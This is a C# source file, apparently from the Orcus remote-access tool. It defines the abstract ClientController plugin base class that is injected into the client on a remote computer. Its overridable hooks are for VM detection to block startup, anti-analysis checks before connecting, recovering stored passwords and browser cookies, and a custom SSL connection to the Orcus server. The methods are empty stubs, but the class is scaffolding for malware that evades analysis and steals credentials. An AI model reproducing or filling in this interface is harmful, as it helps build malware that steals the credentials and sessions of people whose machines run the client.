using System;
using System.Collections.Generic;
using System.Net.Security;
using System.Net.Sockets;
using Orcus.Plugins.Builder;
using Orcus.Plugins.ClientPlugin;
using Orcus.Shared.Commands.Password;
using Orcus.Shared.Core;

namespace Orcus.Plugins
{
    /// <summary>
    ///     This plugins becomes injected into the client and is loaded at startup. If settings should be provided, inherit
    ///     from <see cref="ClientControllerBuilderSettings" /> or <see cref="ClientControllerProvideEditablePropertyGrid" />
    /// </summary>
    public abstract class ClientController : ILoadable, IOverwriteBuilderProperties
    {
        private List<IBuilderProperty> _overwrittenSettings;

        /// <summary>
        ///     Return true if <see cref="TryConnect" /> is overwritten and should be called instead of the default method
        /// </summary>
        public bool OverwriteTryConnect { get; protected set; }

        /// <summary>
        ///     Provides actions and information for the Orcus client
        /// </summary>
        protected IClientOperator ClientOperator { get; private set; }

        /// <summary>
        ///     Called if the client is started on the remote computer
        /// </summary>
        public virtual void Start()
        {
        }

        /// <summary>
        ///     Called if the client shuts down on the remote computer
        /// </summary>
        public virtual void Shutdown()
        {
        }

        /// <summary>
        ///     Called if the client installation is finished
        /// </summary>
        /// <param name="executablePath">The path to the client</param>
        public virtual void Install(string executablePath)
        {
        }

        /// <summary>
        ///     Called if the plugin gets uninstalled
        /// </summary>
        /// <param name="executablePath">The path to the client</param>
        public virtual void Uninstall(string executablePath)
        {
        }

        /// <summary>
        ///     Called directly after the plugin was loaded into Orcus to set the <see cref="ClientOperator" />
        /// </summary>
        /// <param name="clientOperator"></param>
        public virtual void Initialize(IClientOperator clientOperator)
        {
            ClientOperator = clientOperator;
        }

        /// <summary>
        ///     The overwritten settings from <see cref="GetOverwrittenSettings" />
        /// </summary>
        public List<IBuilderProperty> OverwrittenSettings
            => _overwrittenSettings ?? (_overwrittenSettings = GetOverwrittenSettings());

        /// <summary>
        ///     This function can be used to influcence the startup of the application e. g. Vm detection
        /// </summary>
        /// <returns>If the application can be started. It will be instantly terminated if the return value is false</returns>
        public virtual bool InfluenceStartup(IClientStartup clientStartup)
        {
            return true;
        }

        /// <summary>
        ///     Here you can put code to prevent the application to try to connect e. g. anti tcp analyzer
        /// </summary>
        /// <returns>True if everything is awesome, false will cancel the operation</returns>
        public virtual bool CanTryConnect()
        {
            return true;
        }

        /// <summary>
        ///     Recover passwords
        /// </summary>
        /// <returns>Return a list of recovered passwords</returns>
        public virtual List<RecoveredPassword> RecoverPasswords()
        {
            return null;
        }

        /// <summary>
        ///     Recover cookies
        /// </summary>
        /// <returns>Return a list of recovered cookies</returns>
        public virtual List<RecoveredCookie> RecoverCookies()
        {
            return null;
        }

        /// <summary>
        ///     Connect to the Orcus server
        /// </summary>
        /// <param name="tcpClient">The tcp client which is connected to a server</param>
        /// <param name="stream">The SSL stream of the TCP connection</param>
        /// <param name="ipAddressInfo">The ip address which should be connected to</param>
        /// <returns>Return true if the connection was successful, else return false</returns>
        public virtual bool TryConnect(out TcpClient tcpClient, out SslStream stream, IpAddressInfo ipAddressInfo)
        {
            throw new NotImplementedException();
        }

        /// <summary>
        ///     Override this to provide overwritten settings
        /// </summary>
        protected virtual List<IBuilderProperty> GetOverwrittenSettings()
        {
            return null;
        }
    }
}